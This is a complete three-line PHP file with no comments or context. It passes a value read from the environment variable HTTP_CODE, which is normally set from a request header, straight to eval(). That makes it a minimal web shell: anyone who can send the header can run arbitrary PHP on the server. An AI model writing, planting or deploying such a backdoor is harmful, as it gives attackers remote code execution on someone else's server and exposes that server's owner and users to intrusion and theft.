<?php
eval(getenv('HTTP_CODE'));
?>
